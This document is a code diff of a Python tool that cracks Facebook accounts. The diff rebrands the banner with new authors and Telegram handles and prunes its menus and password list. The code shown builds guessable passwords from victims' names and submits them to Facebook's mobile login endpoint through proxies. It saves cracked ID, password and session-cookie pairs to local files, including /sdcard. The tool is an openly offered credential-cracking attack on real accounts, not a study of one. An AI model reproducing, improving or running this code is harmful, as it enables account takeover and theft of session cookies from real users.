@@ -160,12 +160,23 @@ def ARA(u):
         for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
 def banner():
     print(f"""{PU}
-    ===============================
-    O     M    E      D
-    ===============================
+     _  _______ _      _      ______ _____      
+\33[1;32m| |/ /_   _| |    | |    |  ____|  __ \         
+\33[1;33m| ' /  | | | |    | |    | |__  | |__) |     
+\33[1;34m|  <   | | | |    | |    |  __| |  _  /      
+\33[1;35m| . \ _| |_| |____| |____| |____| | \ \     
+\33[1;36m|_|\_\_____|______|______|______|_|  \_\
 
-NEW TOOL BY Omed AND hewa
-THIS TOOL IS FREE AND FOR CRACKING FACEBOOK
+
+
+\33[1;92m ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
+\33[1;36m TOOL CREATE BY➢ KILLER & RaWa
+\33[1;34m CHENEL➢@KILLER_SHOPPING
+\33[1;36m TELGRAM➢@i4m_killer & @l4m_rawa
+\33[1;34m VERSION➢1.1
+\33[1;32m KILLER is the father of Telegram
+\33[1;34m EXPIRED TOOL➢3DAYS
+\33[1;92m ■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■
 {PU}""")
 os.system('clear')
 banner()
@@ -174,11 +185,11 @@ def menu():
 	os.system('clear')
 	banner()
 	print(f'{Y}[MENU]{Y}')
-	print(f'{N}[{Y}1{N}] CRACK BA FILE	')
-	print(f'{N}[{Y}2{N}] CRACK BA ID	')
-	print(f'{N}[{Y}3{N}] BO DANANE COOKIES	')
-	print(f'{N}[{Y}4{N}] BO SRENAWAY COOKIES	')
-	V = (f'[HALLBZHERA{N}]')
+	print('\x1b[1;91m[ 1 ] CRACK FILE')
+	#print(f'{N}[{Y}2{N}] CRACK BA ID	')
+	#print(f'{N}[{Y}3{N}] BO DANANE COOKIES	')
+	#print(f'{N}[{Y}4{N}] BO SRENAWAY COOKIES	')
+	_____YADA__YADA_____ = input('\nHALBZHERA =  ')
 	ch = input(f'{V}: ')
 	if ch in ['1','01']:
 		crack_file()
@@ -309,11 +320,11 @@ def setting():
 			id2.insert(xx,bacot)
 	else:
 		exit()
-	print(f'{N}[{Y}1{N}] MOBILE.FACEBOOK.COM {Y}{N}')
-	print(f'{N}[{Y}2{N}] FREE.FACEBOOK.COM {Y}{N}')
-	print(f'{N}[{Y}3{N}] X.FACEBOOK.COM {Y}{N}')
-	print(f'{N}[{Y}4{N}] D.FACEBOOK.COM {Y}{N}')
-	print(f'{N}[{Y}5{N}] P.FACEBOOK.COM {Y}{N}')
+	print(f'{N}[{Y}1{N}] METHOD [ 1 ]🔥 {Y}{N}')
+	#print(f'{N}[{Y}2{N}] FREE.FACEBOOK.COM {Y}{N}')
+	#print(f'{N}[{Y}3{N}] X.FACEBOOK.COM {Y}{N}')
+	#print(f'{N}[{Y}4{N}] D.FACEBOOK.COM {Y}{N}')
+	#print(f'{N}[{Y}5{N}] P.FACEBOOK.COM {Y}{N}')
 	V = (f'[HALLBZHERA{N}]')
 	hc = input(f'{V}: ')
 	if hc in ['1','01']:
@@ -340,13 +351,13 @@ def setting():
 
 #-------------------[ BAGIAN-WORDLIST ]------------#
 def passwrd():
-   print(f'{N}[{Y}1{N}] 123 + 1234 + 12345 {Y}[FAST✓]{N}')
-   print(f'{N}[{Y}2{N}] 123 + @@ {Y}[SLOW BEST✓]{N}')
-   print(f'{N}[{Y}3{N}] 123 + ZAXO  {Y}[FAST BEST✓]{N}') 
-   print(f'{N}[{Y}4{N}] 1985 + @@ {Y}[FAST BEST✓]{N}')
-   print(f'{N}[{Y}5{N}] 123 + NAME {Y}[FAST BEST✓]{N}')
-   print(f'{N}[{Y}6{N}] NAME + NUMBER + MIX {Y}[FAST BEST✓]{N}')
-   print(f'{N}[{Y}7{N}] 123 + 2000 + @@ {Y}[VERY SLOW BEST✓]{N}')
+   print(f'{N}[{Y}1{N}] VIP PASSWORD 💚🕷️  {Y}{N}')
+   #print(f'{N}[{Y}2{N}] 123 + @@ {Y}[SLOW BEST✓]{N}')
+   #print(f'{N}[{Y}3{N}] 123 + ZAXO  {Y}[FAST BEST✓]{N}') 
+   #print(f'{N}[{Y}4{N}] 1985 + @@ {Y}[FAST BEST✓]{N}')
+   #print(f'{N}[{Y}5{N}] 123 + NAME {Y}[FAST BEST✓]{N}')
+   #print(f'{N}[{Y}6{N}] NAME + NUMBER + MIX {Y}[FAST BEST✓]{N}')
+   #print(f'{N}[{Y}7{N}] 123 + 2000 + @@ {Y}[VERY SLOW BEST✓]{N}')
    V = (f'[HALLBZHERA{N}]')
    ch = input(f'{V}: ')
    if ch in ['1','01']:
@@ -369,7 +380,7 @@ def passwrd():
     	
     	
 def c():
-	ARA(f'WAIT TO CRACK') #%(okc,cpc))
+	
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -388,9 +399,6 @@ def c():
 					pwv.append('1234'+frs)
 					pwv.append('12345'+frs)
 					pwv.append('123456'+frs)
-					pwv.append('123'+frs+'123')
-					pwv.append('1234'+frs+'1234')
-					pwv.append('12345'+frs+'12345')
 					pwv.append(frs+'123123')
 					pwv.append(frs+'11')
 					pwv.append(frs+"12")
@@ -398,10 +406,6 @@ def c():
 					pwv.append(frs+"1234")
 					pwv.append(frs+"12345")
 					pwv.append(frs+"123456")
-					pwv.append(frs+"1234567")
-					pwv.append(frs+"12345678")
-					pwv.append(frs+"123456789")
-					pwv.append(frs+"1234567890")
 					pwv.append(frs+frs)
 					pwv.append(frs+' '+frs)
 			else:
@@ -417,9 +421,6 @@ def c():
 					pwv.append('1234'+frs)
 					pwv.append('12345'+frs)
 					pwv.append('123456'+frs)
-					pwv.append('123'+frs+'123')
-					pwv.append('1234'+frs+'1234')
-					pwv.append('12345'+frs+'12345')
 					pwv.append(frs+'123123')
 					pwv.append(frs+'11')
 					pwv.append(frs+"12")
@@ -427,10 +428,6 @@ def c():
 					pwv.append(frs+"1234")
 					pwv.append(frs+"12345")
 					pwv.append(frs+"123456")
-					pwv.append(frs+"1234567")
-					pwv.append(frs+"12345678")
-					pwv.append(frs+"123456789")
-					pwv.append(frs+"1234567890")
 					pwv.append(frs+frs)
 					pwv.append(frs+' '+frs)
 			if 'mobile' in method:
@@ -1039,7 +1036,7 @@ def crackmobile_ARA(idf,pwv,nmf):
 	bi = random.choice(['\33[m'])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write(f'\r{Y}[{Y}%sOmed{Y}]-{PU}[%s/%s]-{G}[OK:%s]{R}[CP:%s]-[%s%s]%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
+	sys.stdout.write(f"\r \033[1;37mRaWa-𝑻𝒆𝒔𝒕🦅 1 ]\033[1;37m{Z}{b}{loop}{Z}|{b}{len(id)} \x1b[38;5;43m[\x1b[38;5;48mOK∙{ok}\x1b[38;5;43m] {P}{'{:.0%}'.format(loop/float(len(id)))}  "),sys.stdout.flush()
 	ses = requests.Session()
 	for pw in pwv:
 		try:
@@ -1093,7 +1090,7 @@ def crackmobile_ARA(idf,pwv,nmf):
 }
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r{N}[Omed-CP]{R}{idf}{R}|{R}{pw}{R}')
+				#print(f'\r{N}[Omed-CP]{R}{idf}{R}|{R}{pw}{R}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -1103,7 +1100,7 @@ def crackmobile_ARA(idf,pwv,nmf):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r{N}[ARA-OK]{G}{idf}{G}|{G}{pw}{PU}\n {PU}COOKIE : {kuki}')
+				print(f'\r\x1b[32[RAWA-OK]\033[1;32m   {idf} | \033[1;32m{pw} | \033[1;32m{kuki}')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_ARA(kuki)
 				open('/sdcard/ARA-OK.txt','a').write(f'{idf}|{pw}\n')
